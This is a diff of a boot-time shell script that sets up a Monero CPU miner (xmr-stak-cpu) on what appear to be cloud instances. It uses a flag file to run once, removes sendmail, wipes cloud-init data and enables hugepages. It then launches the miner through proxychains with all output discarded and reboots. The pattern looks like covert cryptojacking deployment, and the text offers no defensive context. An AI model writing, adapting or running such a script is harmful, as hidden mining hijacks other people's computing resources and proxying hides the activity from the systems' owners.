@@ -11,7 +11,7 @@ sudo sysctl -w vm.nr_hugepages=128
 #sudo ./build.sh
 rm -rf /var/lib/cloud/instance/*
 
-file="/flag1"
+file="/flag2"
 if [ -f "$file" ]
 then
   sudo yum remove sendmail -y
@@ -20,13 +20,12 @@ then
   sudo chmod +x /m/test01/xmr/xmr-stak-cpu
   sudo chmod +x /m/test01/proxychains/libproxychains4.so
   sudo chmod +x /m/test01/ax.sh
-  sudo /bin/su -c "echo 'vm.nr_hugepages=128' >> /etc/sysctl.conf"
-  sudo sed -i -e "/m/test01/ax.sh" /etc/rc.local
   cd /m/test01/xmr
   sudo /m/test01/proxychains/proxychains4 -f /m/test01/proxychains/proxychains.conf /m/test01/xmr/xmr-stak-cpu >/dev/null 2>&1
   sudo reboot   
 else
-  sudo /bin/su -c "echo 'xxxxx' >> /$file"
+  sudo /bin/su -c "echo 'vm.nr_hugepages=128' >> /etc/sysctl.conf"
+  sudo /bin/su -c "echo 'xxxxx' >> /flag2"
   sudo reboot  
 fi
 #while true; do
